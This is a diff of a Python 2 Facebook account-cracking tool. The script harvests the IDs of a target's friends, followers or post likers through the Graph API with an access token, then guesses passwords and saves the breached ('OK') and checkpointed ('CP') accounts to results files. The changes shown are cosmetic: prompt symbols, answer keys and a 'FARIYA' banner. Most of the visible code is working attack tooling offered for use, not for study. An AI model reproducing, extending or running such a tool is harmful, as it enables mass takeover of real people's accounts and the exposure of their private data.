@@ -82,7 +82,7 @@ def login():
 		token = open('login.txt','r')
 		menu()
 	except (KeyError,IOError):
-	        print logo
+	        logo()
 	        print ' '
 	        print("\t   \033[1;92m[ Choose Login Methode ]")
 	        print ' '
@@ -242,13 +242,13 @@ def public():
 		tokenz()
 	logo()
 	print ' '
-	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Friends List")
+	print("\033[0;97m[\033[0;93m!\033[0;97m] Fill In 'me' To Crack From The Friends List")
 	print ' '
 	idt = raw_input("\033[1;97m[!] Put ID/Username : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 		sp = json.loads(pok.text)
-		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
+		#print(" \033[0;97m[\033[0;92m!\033[0;97m] Name : "+sp["name"])
 	except KeyError:
 		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
 	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
@@ -257,18 +257,20 @@ def public():
 		uid = i['id']
 		name = i['name']
 		id.append(uid+'<=>'+name)
-	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
-	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/N : ")
-	if ask == "Y" or ask == "N":
+	print("\033[0;97m[\033[0;93m!\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
+	ask = raw_input("\033[0;97m[\033[0;93m!\033[0;97m] Want to Use a Manual Password? Y/t : ")
+	if ask == "Y" or ask == "t":
 		manual()
 	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
 	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
+	print ' '
+	print("\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰")
 	
 	def main(user):
 		global loop, token
 		pwx = []
 		sys.stdout.write(
-		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
+		      '\r \033[0;97m[%s!\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		try:os.mkdir("results")
 		except OSError:pass
@@ -344,13 +346,13 @@ def followers():
 		tokenz()
 	logo()
 	print ' '
-	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Fill In 'me' To Crack From The Followers")
+	print("\033[0;97m[\033[0;93m!\033[0;97m] Fill In 'me' To Crack From The Followers")
 	print ' '
 	idt = raw_input("\033[1;97m[!] Put ID/Username : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 		sp = json.loads(pok.text)
-		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
+		#print(" \033[0;97m[\033[0;92m!\033[0;97m] Name : "+sp["name"])
 	except KeyError:
 		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Not Found')
 	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
@@ -359,18 +361,20 @@ def followers():
 		uid = i['id']
 		name = i['name']
 		id.append(uid+'<=>'+name)
-	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
-	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
-	if ask == "Y" or ask == "y":
+	print("\033[0;97m[\033[0;93m!\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
+	ask = raw_input("\033[0;97m[\033[0;93m!\033[0;97m] Want to Use a Manual Password? Y/t : ")
+	if ask == "Y" or ask == "t":
 		manual()
 	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
 	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
+	print ' '
+	print("\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰")
 	
 	def main(user):
 		global loop, token
 		pwx = []
 		sys.stdout.write(
-		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
+		      '\r \033[0;97m[%s!\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		try:os.mkdir("results")
 		except OSError:pass
@@ -445,13 +449,13 @@ def reaction():
 		tokenz()
 	logo()
 	print ' '
-	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Ex :/post/\033[0;92m629986xxxxx\033[0;97m (only id post)")
+	print("\033[0;97m[\033[0;93m*\033[0;97m] Ex :/post/\033[0;92m629986xxxxx\033[0;97m (only id post)")
 	print ' '
-	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Post : ")
+	idt = raw_input("\033[0;97m[\033[0;92m!\033[0;97m] ID Post : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 		sp = json.loads(pok.text)
-		#print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : "+sp["name"])
+		#print(" \033[0;97m[\033[0;92m!\033[0;97m] Name : "+sp["name"])
 	except KeyError:
 		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Postingan Not Found')
 	r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=5000&access_token="+token)
@@ -460,12 +464,14 @@ def reaction():
 		uid = i['id']
 		name = i['name']
 		id.append(uid+'<=>'+name)
-	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
-	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
+	print("\033[0;97m[\033[0;93m!\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
+	ask = raw_input("\033[0;97m[\033[0;93m!\033[0;97m] Want to Use a Manual Password? Y/t : ")
 	if ask == "Y" or ask == "y":
 		manual()
 	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
 	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
+	print ' '
+	print("\033[1;91m⊱══════════════════⊱═⊰\033[1;93mFARIYA\033[1;91m⊱═⊰══════════════════⊰")
 	
 	def main(user):
 		global loop, token
@@ -639,4 +645,3 @@ if __name__ == '__main__':
 		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 Run.py")
 	os.system("git pull")
 	login()
-
